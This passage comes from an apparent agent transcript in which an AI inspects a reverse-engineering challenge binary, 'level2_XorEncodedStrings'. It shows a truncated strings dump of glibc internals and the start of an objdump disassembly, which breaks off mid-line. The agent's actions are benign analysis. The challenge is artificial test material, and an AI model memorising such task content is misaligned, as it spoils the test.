!robust\nmutex->__data.__owner == 0\npthread_mutex_unlock.c\ntpp.c\nUnknown error \n%s%d\nwcrtomb.c\nANSI_X3.4-1968//TRANSLIT\nwcsrtombs.c\ndata.__outbuf[-1] == '\\0'\n__mbsinit (data.__statep)\n/usr/lib/getconf\nGETCONF_DIR\n/proc/sys/kernel/rtsig-max\nGLRO(dl_minsigstacksize) != 0\nminsigstacksize != 0\n/proc/sys/kernel/ngroups_max\npthread_stack_min != 0\nILP32_OFF32\nILP32_OFFBIG\nGLRO(dl_pagesize) != 0\n/proc/self/maps\n<program name unknown>\n%s: %s: %s%s%s%s%s\nDYNAMIC LINKER BUG!!!\nfile too short\ncannot read file data\ninvalid ELF header\ninternal error\nnonzero padding in e_ident\nELF file ABI version invalid\nELF file OS ABI invalid\n<main program>\n search path=\n\t\t(%s from file %s)\n\t\t(%s)\n  trying file=%s\ncannot allocate name record\ndl-load.c\nlastp != NULL\nORIGIN\nPLATFORM\nlib/x86_64-linux-gnu\nsystem search path\npelem->dirname[0] == '/'\nl->l_type != lt_loaded\nRUNPATH\nRPATH\ncannot close file descriptor\ncannot stat shared object\ncannot map zero-fill pages\nnsid == LM_ID_BASE\nlibc.so.6\nr->r_state == RT_ADD\nnsid >= 0\nnsid < GL(dl_nns)\nwrong ELF class: ELFCLASS32\nout of memory\n, version \nprotected\nnormal\ndl-lookup.c\nundefined symbol: %s%s%s\nsymbol lookup error\n [%s]\n/proc/self/exe\nlinkval[0] == '/'\ndl-printf.c\nniov < NIOVMAX\nwidth < IFMTSIZE\n! \"invalid format specifier\"\n (lazy)\nrelocation processing: %s%s\ndl-runtime.c\ndl-setup_hash.c\n/etc/ld.so.cache\n search cache=%s\nglibc-ld.so.cache1.1\nld.so-1.7.0\ndl-cache.c\ncache != NULL\ngconv_db.c\nstep->__end_fct == NULL\ngconv_conf.c\nresult == NULL\nelem != NULL\ncwd != NULL\nalias\nmodule\n.conf\n%s/%s\nISO-10646/UCS4/\n=INTERNAL->ucs4\n=ucs4->INTERNAL\nUCS-4LE//\n=INTERNAL->ucs4le\n=ucs4le->INTERNAL\nISO-10646/UTF8/\n=INTERNAL->utf8\n=utf8->INTERNAL\nISO-10646/UCS2/\n=ucs2->INTERNAL\n=INTERNAL->ucs2\nANSI_X3.4-1968//\n=ascii->INTERNAL\n=INTERNAL->ascii\nUNICODEBIG//\n=ucs2reverse->INTERNAL\n=INTERNAL->ucs2reverse\ngconv_builtin.c\n../iconv/skeleton.c\noutbufstart == NULL\noutbuf == outerr\ngconv_simple.c\n*outptrp + 4 > outend\n../iconv/loop.c\nch != 0xc0 && ch != 0xc1\nGCONV_PATH\ngconv_dl.c\nobj->counter > 0\nfound->handle == NULL\ngconv\ngconv_init\ngconv_end\nLOCPATH\nISO/IEC 14652 i18n FDCC-set\nKeld Simonsen\nkeld@dkuug.dk\n+45 3122-6543\n+45 3325-6543\n1997-12-20\n^[yY]\n^[nN]\n%p%t%g%t%m%t%f\n+%c %a %l\nSunday\nMonday\nTuesday\nWednesday\nThursday\nFriday\nSaturday\nJanuary\nFebruary\nMarch\nApril\nJune\nJuly\nAugust\nSeptember\nOctober\nNovember\nDecember\n%a %b %e %H:%M:%S %Y\n%m/%d/%y\n%H:%M:%S\n%I:%M:%S %p\n%a %b %e %H:%M:%S %Z %Y\nPOSIX\nlibc\nOUTPUT_CHARSET\ncharset=\nLANGUAGE\n/usr/share/locale\nplural=\nnplurals=\ngrouping_iterator.c\nit->remaining > 0\nXprintf_buffer_pad_1.c\nXprintf_buffer_putc_1.c\nXprintf_buffer_puts_1.c\nprintf_buffer_to_file.c\nXprintf_buffer_write.c\nprintf_fp.c\nincr <= powers->p_expo\np.frac[p.fracsize - 1] < 10\nwcp >= wstartp + 1\nwstartp[0] == '1'\n0.0001\ninfo->extra == 0\ntranslated_number_width.c\n'0' <= *p && *p <= '9'\nSuccess\nOperation not permitted\nNo such file or directory\nNo such process\nInterrupted system call\nInput/output error\nNo such device or address\nArgument list too long\nExec format error\nBad file descriptor\nNo child processes\nCannot allocate memory\nPermission denied\nBad address\nBlock device required\nDevice or resource busy\nFile exists\nInvalid cross-device link\nNo such device\nNot a directory\nIs a directory\nInvalid argument\nToo many open files in system\nToo many open files\nText file busy\nFile too large\nNo space left on device\nIllegal seek\nRead-only file system\nToo many links\nBroken pipe\nNumerical result out of range\nResource deadlock avoided\nFile name too long\nNo locks available\nFunction not implemented\nDirectory not empty\nNo message of desired type\nIdentifier removed\nChannel number out of range\nLevel 2 not synchronized\nLevel 3 halted\nLevel 3 reset\nLink number out of range\nProtocol driver not attached\nNo CSI structure available\nLevel 2 halted\nInvalid exchange\nInvalid request descriptor\nExchange full\nNo anode\nInvalid request code\nInvalid slot\nBad font file format\nDevice not a stream\nNo data available\nTimer expired\nOut of streams resources\nMachine is not on the network\nPackage not installed\nObject is remote\nLink has been severed\nAdvertise error\nSrmount error\nCommunication error on send\nProtocol error\nMultihop attempted\nRFS specific error\nBad message\nName not unique on network\nFile descriptor in bad state\nRemote address changed\nStreams pipe error\nToo many users\nDestination address required\nMessage too long\nProtocol not available\nProtocol not supported\nSocket type not supported\nOperation not supported\nProtocol family not supported\nAddress already in use\nNetwork is down\nNetwork is unreachable\nConnection reset by peer\nNo buffer space available\nConnection timed out\nConnection refused\nHost is down\nNo route to host\nOperation already in progress\nOperation now in progress\nStale file handle\nStructure needs cleaning\nNot a XENIX named type file\nNo XENIX semaphores available\nIs a named type file\nRemote I/O error\nDisk quota exceeded\nNo medium found\nWrong medium type\nOperation canceled\nRequired key not available\nKey has expired\nKey has been revoked\nKey was rejected by service\nOwner died\nState not recoverable\nwfileops.c\nstatus == __codecvt_partial\niofwide.c\nGLIBC_PRIVATE\ngconv.c\nirreversible != NULL\n,TRANSLIT\n/IGNORE\n,IGNORE\nLC_ALL\nLANG\nfindlocale.c\nlocale_codeset != NULL\n/../\nloadarchive.c\narchmapped == &headmap\nloadlocale.c\ncategory == LC_CTYPE\nprintf_buffer_as_file.c\nXprintf_buffer_flush.c\ndl-close.c\n! should_be_there\nidx == nloaded\nimap->l_ns == nsid\ntmap->l_ns == nsid\ncannot create scope list\ndlclose\nimap->l_type == lt_loaded\nimap->l_prev != NULL\nshared object not open\ndl-find_object.c\nns == l->l_ns\nresult->allocated >= size\nremaining_to_add > 0\nremaining_to_add == 0\ntarget_seg_index1 == 0\ndl-open.c\ncannot extend global scope\ninvalid mode for dlopen()\nr_state == RT_CONSISTENT\nobject=%s [%lu]\n scope %u:\n no scope\nmode & RTLD_NOLOAD\nmarking %s [%lu] as NODELETE\nld-linux-x86-64.so.2\ncnt + 1 < imap->l_scope_max\nimap->l_need_tls_init == 0\ndl-sort-maps.c\nrpo_head == rpo\nmaps_head == maps\ni < nmaps\ndl-version.c\nneeded != NULL\ndef_offset != 0\nversion lookup error\nGLIBC_ABI_DT_RELR\nlibc.so.\n_rtld_global_ro\nrtld_static_init.c\nsym != NULL\nout of memory\n%s%s%s: %m\nunsupported dlinfo request\ninvalid namespace\ninvalid mode parameter\n__libc_early_init\ndl-call-libc-early-init.c\ncalling fini: %s [%lu]\ndl-deps.c\nmap_index < nlist\ndl-init.c\ncalling init: %s\ncalling preinit: %s\n../nptl/pthread_mutex_lock.c\nUnexpected reloc type in static binary.\nFatal glibc error: Cannot allocate TLS block\nFatal glibc error: %s:%s (%s): assertion failed: %s\n__new_exitfn\nThe futex facility returned an unexpected error code.\nfree(): too many chunks detected in tcache\nfree(): unaligned chunk detected in tcache 2\nfree(): double free detected in tcache 2\nint_mallinfo(): unaligned fastbin chunk detected\nmunmap_chunk(): invalid pointer\nreplaced_arena->attached_threads > 0\n__malloc_info(): unaligned fastbin chunk detected\n  <size from=\"%zu\" to=\"%zu\" total=\"%zu\" count=\"%zu\"/>\n  <unsorted from=\"%zu\" to=\"%zu\" total=\"%zu\" count=\"%zu\"/>\n</sizes>\n<total type=\"fast\" count=\"%zu\" size=\"%zu\"/>\n<total type=\"rest\" count=\"%zu\" size=\"%zu\"/>\n<system type=\"current\" size=\"%zu\"/>\n<system type=\"max\" size=\"%zu\"/>\n<aspace type=\"total\" size=\"%zu\"/>\n<aspace type=\"mprotect\" size=\"%zu\"/>\n<aspace type=\"subheaps\" size=\"%zu\"/>\n<aspace type=\"total\" size=\"%zu\"/>\n<aspace type=\"mprotect\" size=\"%zu\"/>\n<total type=\"fast\" count=\"%zu\" size=\"%zu\"/>\n<total type=\"rest\" count=\"%zu\" size=\"%zu\"/>\n<total type=\"mmap\" count=\"%d\" size=\"%zu\"/>\n<system type=\"current\" size=\"%zu\"/>\n<system type=\"max\" size=\"%zu\"/>\n<aspace type=\"total\" size=\"%zu\"/>\n<aspace type=\"mprotect\" size=\"%zu\"/>\n</malloc>\ncorrupted double-linked list (not small)\nmalloc_consolidate(): unaligned fastbin chunk detected\nmalloc_consolidate(): invalid chunk size\ncorrupted size vs. prev_size in fastbins\nfree(): corrupted unsorted chunks\nfree(): chunks in smallbin corrupted\n((INTERNAL_SIZE_T) chunk2mem (mm) & MALLOC_ALIGN_MASK) == 0\nchunksize_nomask (p) == (0 | PREV_INUSE)\nnew_size > 0 && new_size < (long) (2 * MINSIZE)\nnew_size > 0 && new_size < max_size\n((unsigned long) ((char *) p + new_size) & (heap->pagesize - 1)) == 0\n((char *) p + new_size) == ((char *) heap + heap->size)\n/proc/sys/vm/overcommit_memory\ndouble free or corruption (top)\ndouble free or corruption (out)\ndouble free or corruption (!prev)\nfree(): invalid next size (normal)\ncorrupted size vs. prev_size while consolidating\nfree(): invalid next size (fast)\ndouble free or corruption (fasttop)\n(old_top == initial_top (av) && old_size == 0) || ((unsigned long) (old_size) >= MINSIZE && prev_inuse (old_top) && ((unsigned long) old_end & (pagesize - 1)) == 0)\n(unsigned long) (old_size) < (unsigned long) (nb + MINSIZE)\nbreak adjusted to free malloc space\n((unsigned long) chunk2mem (brk) & MALLOC_ALIGN_MASK) == 0\nmalloc(): unaligned fastbin chunk detected 2\nmalloc(): unaligned fastbin chunk detected\nmalloc(): memory corruption (fast)\nmalloc(): unaligned fastbin chunk detected 3\nmalloc(): smallbin double linked list corrupted\nmalloc(): invalid size (unsorted)\nmalloc(): invalid next size (unsorted)\nmalloc(): mismatching next->prev_size (unsorted)\nmalloc(): unsorted double linked list corrupted\nmalloc(): invalid next->prev_inuse (unsorted)\nmalloc(): largebin double linked list corrupted (nextsize)\nmalloc(): largebin double linked list corrupted (bk)\nmalloc(): unaligned tcache chunk detected\nmalloc(): corrupted unsorted chunks\n(unsigned long) (size) >= (unsigned long) (nb)\nmalloc(): corrupted unsorted chunks 2\n(unsigned long) (newsize) >= (unsigned long) (nb)\nnewsize >= nb && (((unsigned long) (chunk2mem (p))) % alignment) == 0\n!victim || chunk_is_mmapped (mem2chunk (victim)) || &main_arena == arena_for_chunk (mem2chunk (victim))\n!victim || chunk_is_mmapped (mem2chunk (victim)) || ar_ptr == arena_for_chunk (mem2chunk (victim))\n!p || chunk_is_mmapped (mem2chunk (p)) || &main_arena == arena_for_chunk (mem2chunk (p))\n!p || chunk_is_mmapped (mem2chunk (p)) || ar_ptr == arena_for_chunk (mem2chunk (p))\ntcache_thread_shutdown(): unaligned tcache chunk detected\nmremap_chunk(): invalid pointer\n!newp || chunk_is_mmapped (mem2chunk (newp)) || ar_ptr == arena_for_chunk (mem2chunk (newp))\n!mem || chunk_is_mmapped (mem2chunk (mem)) || av == arena_for_chunk (mem2chunk (mem))\n(char *) chunk2mem (p) + 2 * CHUNK_HDR_SZ <= paligned_mem\n(char *) p + size > paligned_mem\n__libc_calloc\n_int_memalign\n_mid_memalign\n_int_realloc\nmremap_chunk\n__libc_realloc\nmunmap_chunk\nheap_trim\nsysmalloc_mmap\nsysmalloc\n_int_malloc\ndetach_arena\nget_free_list\n__libc_malloc\n../sysdeps/unix/sysv/linux/getsysstats.c\n/sys/devices/system/cpu/online\n/sys/devices/system/cpu/possible\nnext_line\n/sys/kernel/mm/transparent_hugepage/hpage_pmd_size\n/sys/kernel/mm/transparent_hugepage/enabled\ncannot allocate memory for thread-local data: ABORT\nlistp->slotinfo[cnt].gen <= GL(dl_tls_generation)\nmap->l_tls_modid == total + cnt\nmap->l_tls_blocksize >= map->l_tls_initimage_size\n(size_t) map->l_tls_offset >= map->l_tls_blocksize\nFailed loading %lu audit modules, %lu are supported.\nresult <= GL(dl_tls_max_dtv_idx) + 1\nresult == GL(dl_tls_max_dtv_idx) + 1\ncannot create TLS data structures\nWARNING: ld.so: invalid GLIBC_TUNABLES `%s': ignored.\nWARNING: ld.so: invalid GLIBC_TUNABLES value `%.*s' for option `%s': ignored.\n0x%lx (min: 0x%lx, max: 0x%lx)\n0x%zx (min: 0x%zx, max: 0x%zx)\n__ehdr_start.e_phentsize == sizeof *GL(dl_phdr)\ninfo[DT_PLTREL]->d_un.d_val == DT_RELA\ninfo[DT_RELAENT]->d_un.d_val == sizeof (ElfW(Rela))\ninfo[DT_RELRENT]->d_un.d_val == sizeof (ElfW(Relr))\nWARNING: Unsupported flag value(s) of 0x%x in DT_FLAGS_1.\nsetup_vdso\n_dl_aux_init\n../sysdeps/generic/dl-tunables-parse.h\n../sysdeps/unix/sysv/linux/getrandom.c\ngrnd_alloc.len < grnd_alloc.cap\n(mode_flags & PRINTF_FORTIFY) != 0\n*** invalid %N$ use detected ***\n*** %n in writable segment detected ***\nFatal error: glibc detected an invalid stdio handle\ne != EDEADLK || (kind != PTHREAD_MUTEX_ERRORCHECK_NP && kind != PTHREAD_MUTEX_RECURSIVE_NP)\nrobust || (oldval & FUTEX_OWNER_DIED) == 0\nPTHREAD_MUTEX_TYPE (mutex) == PTHREAD_MUTEX_ERRORCHECK_NP\ntype == PTHREAD_MUTEX_ERRORCHECK_NP\nnew_prio == -1 || (new_prio >= fifo_min_prio && new_prio <= fifo_max_prio)\nprevious_prio == -1 || (previous_prio >= fifo_min_prio && previous_prio <= fifo_max_prio)\nstatus == __GCONV_OK || status == __GCONV_EMPTY_INPUT || status == __GCONV_ILLEGAL_INPUT || status == __GCONV_INCOMPLETE_INPUT || status == __GCONV_FULL_OUTPUT\nFatal glibc error: gconv module reference counter overflow\ndata.__outbuf != (unsigned char *) dst\n__wcsrtombs\n../sysdeps/unix/sysv/linux/x86/../sysconf.c\n../sysdeps/unix/sysv/linux/sysconf-sigstksz.h\n../sysdeps/unix/sysv/linux/sysconf-pthread_stack_min.h\nlinux_sysconf\n../sysdeps/unix/sysv/linux/getpagesize.c\n__getpagesize\nerror while loading shared libraries\nFatal error: length accounting in _dl_exception_create_format\nFatal error: invalid format in exception string\nout of memory\nFatal glibc error: executable stack is not allowed\nFatal glibc error: cannot enable executable stack as tunable requires\nELF file data encoding not little-endian\nELF file version does not match current one\nonly ET_DYN and ET_EXEC can be loaded\nELF file's phentsize not the expected size\nELF file version ident does not match current one\n(l)->l_name[0] == '\\0' || is_rtld_link_map (l)\ncannot create cache for search path\ncannot create RUNPATH/RPATH copy\ncannot create search path array\ncannot allocate memory for program header\ncannot dynamically load position-independent executable\ncannot enable executable stack as shared object requires\nshared object cannot be dlopen()ed\ncannot create shared object descriptor\nELF load command address/offset not page-aligned\ncannot change memory protections\nfailed to map segment from shared object\nobject file has no loadable segments\ncannot dynamically load executable\nobject file has no dynamic section\nfile=%s [%lu];  generating link map\nfalse && \"TLS not initialized in static application\"\ntype != ET_EXEC || l->l_type == lt_executable\n  dynamic: 0x%0*lx  base: 0x%0*lx   size: 0x%0*zx\n    entry: 0x%0*lx  phdr: 0x%0*lx  phnum:   %*u\nfile=%s [%lu];  needed by %s [%lu]\nfile=%s [%lu];  dynamically loaded by %s [%lu]\nfind library=%s [%lu]; searching\ncannot open shared object file\n_dl_map_object\n_dl_init_paths\nsymbol=%s;  lookup in file=%s [%lu]\nwarning: copy relocation against non-copyable protected symbol `%s' in `%s'\nwarning: direct reference to protected function `%s' in `%s' may break pointer equality\nerror due to GNU_PROPERTY_1_NEEDED_INDIRECT_EXTERN_ACCESS\nmarking %s [%lu] as NODELETE due to unique symbol\nversion == NULL || !(flags & DL_LOOKUP_RETURN_NEWEST)\nmarking %s [%lu] as NODELETE due to reference from main program\nmarking %s [%lu] as NODELETE due to reference from %s [%lu]\nmarking %s [%lu] as NODELETE due to memory allocation failure\nfile=%s [%lu];  needed by %s [%lu] (relocation dependency)\nbinding file %s [%lu] to %s [%lu]: %s symbol `%s'\n../sysdeps/unix/sysv/linux/dl-origin.c\n_dl_get_origin\npid >= 0 && sizeof (pid_t) <= 4\ncannot allocate memory in static TLS block\ncannot make segment writable for relocation\ncannot restore segment prot after reloc\n%s: Symbol `%s' causes overflow in R_X86_64_32 relocation\n%s: Symbol `%s' causes overflow in R_X86_64_PC32 relocation\n%s: Symbol `%s' has different size in shared object, consider re-linking\n%s: IFUNC symbol '%s' referenced in '%s' is defined in the executable and creates an unsatisfiable circular dependency.\n%s: Relink `%s' with `%s' for IFUNC symbol `%s'\n../sysdeps/x86_64/dl-machine.h\nELFW(R_TYPE) (reloc->r_info) == R_X86_64_RELATIVE\n%s: out of memory to store relocation results for %s\nELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT\n_dl_fixup\n(bitmask_nwords & (bitmask_nwords - 1)) == 0\n_dl_setup_hash\ngconv-modules\ncnt < sizeof (map) / sizeof (map[0])\nnstatus == __GCONV_FULL_OUTPUT\ncnt_after <= sizeof (data->__statep->__value.__wchb)\n(state->__count & 7) <= sizeof (state->__value)\ninlen_after <= sizeof (state->__value.__wchb)\ninptr - bytebuf > (state->__count & 7)\ninend != &bytebuf[MAX_NEEDED_INPUT]\ninend - inptr > (state->__count & ~7)\ninend - inptr <= sizeof (state->__value.__wchb)\n/usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache\n%a%N%f%N%d%N%b%N%s %h %e %r%N%C-%z %T%N%c%N\nISO/IEC JTC1/SC22/WG20 - internationalization\nC/o Keld Simonsen, Skt. Jorgens Alle 8, DK-1615 Kobenhavn V\nANSI_X3.4-1968\nmessages\n/locale.alias\nbuf->write_ptr != buf->write_end\nbuf->write_ptr < buf->write_end\nbuf->base.write_end == buf->fp->_IO_write_end\ncy == 1 || (p.frac[p.fracsize - 2] == 0 && p.frac[0] == 0)\ncy == 0 || p.tmp[p.tmpsize - 1] < 20\n0 <= p.exponent && p.exponent < 3 && p.exponent + to_shift < BITS_PER_MP_LIMB\np.expsign == 0 || intdig_max == 1\n../stdio-common/printf_fphex.c\nResource temporarily unavailable\nInappropriate ioctl for device\nNumerical argument out of domain\nToo many levels of symbolic links\nValue too large for defined data type\nCan not access a needed shared library\nAccessing a corrupted shared library\n.lib section in a.out corrupted\nAttempting to link in too many shared libraries\nCannot exec a shared library directly\nInvalid or incomplete multibyte or wide character\nInterrupted system call should be restarted\nSocket operation on non-socket\nProtocol wrong type for socket\nAddress family not supported by protocol\nCannot assign requested address\nNetwork dropped connection on reset\nSoftware caused connection abort\nTransport endpoint is already connected\nTransport endpoint is not connected\nCannot send after transport endpoint shutdown\nToo many references: cannot splice\nOperation not possible due to RF-kill\nMemory page has hardware error\n_IO_fwide\n../sysdeps/unix/sysv/linux/getcwd.c\nerrno != ERANGE || buf != NULL || size != 0\n__getcwd\noutbuf != NULL && *outbuf != NULL\n__gconv\nheadmap.len == archive_stat.st_size\nfile->stream._IO_write_ptr >= file->next->write_ptr\nfile->stream._IO_write_ptr <= file->next->write_end\nfile->stream._IO_write_base == file->next->write_base\nfile->stream._IO_write_end == file->next->write_end\nclosing file=%s; direct_opencount=%u\n(*lp)->l_idx >= 0 && (*lp)->l_idx < nloaded\njmap->l_idx >= 0 && jmap->l_idx < nloaded\nimap->l_type == lt_loaded && !imap->l_nodelete_active\nfile=%s [%lu];  destroying link map\nTLS generation counter wrapped!  Please report as described in <http://www.debian.org/Bugs/>.\nFatal glibc error: cannot allocate memory for find-object data\nnew_nlist < ns->_ns_global_scope_alloc\nadd %s [%lu] to global scope\nadded <= ns->_ns_global_scope_pending_adds\nopening file=%s [%lu]; direct_opencount=%u\nno more namespaces available for dlmopen()\ninvalid target namespace in dlmopen()\nCPU ISA level is lower than required\nactivating NODELETE for %s [%lu]\ncannot allocate address lookup data\nTLS generation counter wrapped!  Please report this.\nupdate_scopes\n_dl_open\nunsupported version %s of Verneed record\nchecking for version `%s' in file %s [%lu] required by file %s [%lu]\nno version information available (required by %s)\nunsupported version %s of Verdef record\nweak version `%s' not found (required by %s)\nversion `%s' not found (required by %s)\ncannot allocate version reference table\nDT_RELR without GLIBC_ABI_DT_RELR dependency\nmatch_symbol\ncannot allocate dependency buffer\nDST not allowed in SUID/SGID programs\ncannot load auxiliary `%s' because of empty dynamic string token substitution\nempty dynamic string token substitution\nload auxiliary object=%s requested by file=%s\ncannot allocate dependency list\nmap->l_searchlist.r_list == NULL\ncannot allocate symbol search list\nl->l_relocated || l->l_type == lt_executable\ncall_init\nRTLD_NEXT used in code not dynamically loaded\n(mutex_kind & PTHREAD_MUTEX_PRIO_INHERIT_NP) != 0\n(mutex_kind & PTHREAD_MUTEX_ROBUST_NORMAL_NP) == 0\n(mutex_kind & PTHREAD_MUTEX_PSHARED_BIT) == 0\nintel_check_word\n__internal_atexit\n_int_free_maybe_consolidate\nremove_from_free_list\n__malloc_arena_thread_freeres\nalways madvise [never]\nalways [madvise] never\n[always] madvise never\n_dl_add_to_slotinfo\n_dl_allocate_tls_init\n_dl_assign_tls_modid\nelf_get_dynamic_info\ntunable_str_comma_init\n__getrandom_reset_state\nprintf_positional\n_IO_new_file_fopen\nenlarge_userbuf\n__pthread_mutex_lock_full\n___pthread_mutex_lock\n__pthread_mutex_unlock_usercnt\n__pthread_tpp_change_priority\n__wcrtomb_internal\n__get_pthread_stack_min\nsysconf_sigstksz\n_dl_notify_new_object\n_dl_map_object_from_fd\nadd_name_to_object\nexpand_dynamic_string_token\n_dl_lookup_symbol_x\n_dl_debug_vdprintf\nelf_machine_rela_relative\n_dl_load_cache_lookup\n__gconv_release_step\n__gconv_get_path\n__gconv_get_builtin_trans\ninternal_ucs2_loop_single\nucs2_internal_loop_single\nutf8_internal_loop_single\ninternal_utf8_loop_single\ninternal_ascii_loop_single\nucs4le_internal_loop\ndo_release_shlib\n__gconv_find_shlib\n/usr/share/locale\n__grouping_iterator_next\n__printf_buffer_pad_1\n__printf_buffer_putc_1\n__printf_buffer_puts_1\n__printf_buffer_flush_to_file\n__printf_buffer_write\n__printf_fp_buffer_1\n__printf_fphex_buffer\n__translated_number_width\n__wprintf_buffer_putc_1\n_IO_wfile_underflow\n_nl_find_locale\n/usr/lib/locale\n_nl_archive_subfreeres\n_nl_load_locale_from_archive\n/usr/lib/locale/locale-archive\n_nl_intern_locale_data\n__printf_buffer_as_file_commit\n__printf_buffer_flush\n__wprintf_buffer_flush\nremove_slotinfo\n_dl_close_worker\n_dl_find_object_update_1\n_dl_find_object_slow\nadd_to_global_update\nupdate_tls_slotinfo\ndl_open_worker_begin\n_dl_find_dso_for_object\n_dl_sort_maps_dfs\n_dl_check_map_versions\n__rtld_static_init\n_dl_call_libc_early_init\n_dl_map_object_deps\n__pthread_mutex_cond_lock_full\n__pthread_mutex_cond_lock\nUUUUUUUU\n?33333333\nUUUUUUU\nP^Cy\n^B{\t$I\n0123456789abcdefghijklmnopqrstuvwxyz\n0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\ncannot apply additional memory protection after relocation\n/usr/lib/x86_64-linux-gnu/gconv\ninternal_ucs2reverse_loop_single\n__gconv_transform_internal_ucs2reverse\nucs2reverse_internal_loop_single\n__gconv_transform_ucs2reverse_internal\n__gconv_transform_internal_ucs2\n__gconv_transform_ucs2_internal\n__gconv_transform_utf8_internal\n__gconv_transform_internal_utf8\n__gconv_transform_internal_ascii\n__gconv_transform_ascii_internal\n__gconv_transform_ucs4le_internal\n__gconv_transform_internal_ucs4le\n__gconv_transform_ucs4_internal\n__gconv_transform_internal_ucs4\n_dlfo_mappings_segment_allocate\n__pthread_mutex_cond_lock_adjust\n????????????????\n                \nGCONV_PATH\nGETCONF_DIR\nGLIBC_TUNABLES\nHOSTALIASES\nLD_AUDIT\nLD_BIND_NOT\nLD_BIND_NOW\nLD_DEBUG\nLD_DEBUG_OUTPUT\nLD_DYNAMIC_WEAK\nLD_LIBRARY_PATH\nLD_ORIGIN_PATH\nLD_PRELOAD\nLD_PROFILE\nLD_SHOW_AUXV\nLD_VERBOSE\nLD_WARN\nLOCALDOMAIN\nLOCPATH\nMALLOC_ARENA_MAX\nMALLOC_ARENA_TEST\nMALLOC_MMAP_MAX_\nMALLOC_MMAP_THRESHOLD_\nMALLOC_PERTURB_\nMALLOC_TOP_PAD_\nMALLOC_TRACE\nMALLOC_TRIM_THRESHOLD_\nNIS_PATH\nNLSPATH\nRESOLV_HOST_CONF\nRES_OPTIONS\nTMPDIR\nTZDIR\nsse2\nx86_64\navx512_1\nEPERM\nENOENT\nESRCH\nEINTR\nENXIO\nE2BIG\nENOEXEC\nEBADF\nECHILD\nEDEADLK\nENOMEM\nEACCES\nEFAULT\nENOTBLK\nEBUSY\nEEXIST\nEXDEV\nENODEV\nENOTDIR\nEISDIR\nEINVAL\nEMFILE\nENFILE\nENOTTY\nETXTBSY\nEFBIG\nENOSPC\nESPIPE\nEROFS\nEMLINK\nEPIPE\nEDOM\nERANGE\nEAGAIN\nEINPROGRESS\nEALREADY\nENOTSOCK\nEMSGSIZE\nEPROTOTYPE\nENOPROTOOPT\nEPROTONOSUPPORT\nESOCKTNOSUPPORT\nEOPNOTSUPP\nEPFNOSUPPORT\nEAFNOSUPPORT\nEADDRINUSE\nEADDRNOTAVAIL\nENETDOWN\nENETUNREACH\nENETRESET\nECONNABORTED\nECONNRESET\nENOBUFS\nEISCONN\nENOTCONN\nEDESTADDRREQ\nESHUTDOWN\nETOOMANYREFS\nETIMEDOUT\nECONNREFUSED\nELOOP\nENAMETOOLONG\nEHOSTDOWN\nEHOSTUNREACH\nENOTEMPTY\nEUSERS\nEDQUOT\nESTALE\nEREMOTE\nENOLCK\nENOSYS\nEILSEQ\nEBADMSG\nEIDRM\nEMULTIHOP\nENODATA\nENOLINK\nENOMSG\nENOSR\nENOSTR\nEOVERFLOW\nEPROTO\nETIME\nECANCELED\nEOWNERDEAD\nENOTRECOVERABLE\nERESTART\nECHRNG\nEL2NSYNC\nEL3HLT\nEL3RST\nELNRNG\nEUNATCH\nENOCSI\nEL2HLT\nEBADE\nEBADR\nEXFULL\nENOANO\nEBADRQC\nEBADSLT\nEBFONT\nENONET\nENOPKG\nEADV\nESRMNT\nECOMM\nEDOTDOT\nENOTUNIQ\nEBADFD\nEREMCHG\nELIBACC\nELIBBAD\nELIBSCN\nELIBMAX\nELIBEXEC\nESTRPIPE\nEUCLEAN\nENOTNAM\nENAVAIL\nEISNAM\nEREMOTEIO\nENOMEDIUM\nEMEDIUMTYPE\nENOKEY\nEKEYEXPIRED\nEKEYREVOKED\nEKEYREJECTED\nERFKILL\nEHWPOISON\n/lib/x86_64-linux-gnu/\n/usr/lib/x86_64-linux-gnu/\n/lib/\n/usr/lib/\nunexpected reloc type 0x\nunexpected PLT reloc type 0x\nUCS4//\nISO-10646/UCS4/\nUCS-4//\nISO-10646/UCS4/\nUCS-4BE//\nISO-10646/UCS4/\nCSUCS4//\nISO-10646/UCS4/\nISO-\n... [output truncated]\n[output was truncated]"
+      }
+    ]
+  },
+  {
+    "role": "assistant",
+    "content": [
+      {
+        "type": "tool_use",
+        "id": "gemini_objdump_0",
+        "name": "objdump",
+        "input": {
+          "flags": "-d",
+          "path": "/workspace/level2_XorEncodedStrings"
+        },
+        "metadata": {
+          "thoughtSignature": "EjQKMgEMOdbHwjl9AZHCLRZ4Pd/LZVmPxKp7AojvhtFIn67wOBsa4GamglV3mHXOJ2FgXeWv"
+        }
+      }
+    ]
+  },
+  {
+    "role": "user",
+    "content": [
+      {
+        "type": "tool_result",
+        "tool_use_id": "gemini_objdump_0",
+        "content": "\n/workspace/level2_XorEncodedStrings:     file format elf64-x86-64\n\n\nDisassembly of section .init:\n\n0000000000401000 <_init>:\n  401000:\t48 83 ec 08          \tsub    $0x8,%rsp\n  401004:\t48 c7 c0 00 00 00 00 \tmov    $0x0,%rax\n  40100b:\t48 85 c0             \ttest   %rax,%rax\n  40100e:\t74 02                \tje     401012 <_init+0x12>\n  401010:\tff d0                \tcall   *%rax\n  401012:\t48 83 c4 08          \tadd    $0x8,%rsp\n  401016:\tc3                   \tret    \n\nDisassembly of section .plt:\n\n0000000000401018 <.plt>:\n  401018:\tff 25 e2 2f 0a 00    \tjmp    *0xa2fe2(%rip)        # 4a4000 <_GLOBAL_OFFSET_TABLE_+0x18>\n  40101e:\t66 90                \txchg   %ax,%ax\n  401020:\tff 25 e2 2f 0a 00    \tjmp    *0xa2fe2(%rip)        # 4a4008 <_GLOBAL_OFFSET_TABLE_+0x20>\n  401026:\t66 90                \txchg   %ax,%ax\n  401028:\tff 25 e2 2f 0a 00    \tjmp    *0xa2fe2(%rip)        # 4a4010 <_GLOBAL_OFFSET_TABLE_+0x28>\n  40102e:\t66 90                \txchg   %ax,%ax\n  401030:\tff 25 e2 2f 0a 00    \tjmp    *0xa2fe2(%rip)        # 4a4018 <_GLOBAL_OFFSET_TABLE_+0x30>\n  401036:\t66 90                \txchg   %ax,%ax\n  401038:\tff 25 e2 2f 0a 00    \tjmp    *0xa2fe2(%rip)        # 4a4020 <_GLOBAL_OFFSET_TABLE_+0x38>\n  40103e:\t66 90                \txchg   %ax,%ax\n  401040:\tff 25 e2 2f 0a 00    \tjmp    *0xa2fe2(%rip)        # 4a4028 <_GLOBAL_OFFSET_TABLE_+0x40>\n  401046:\t66 90                \txchg   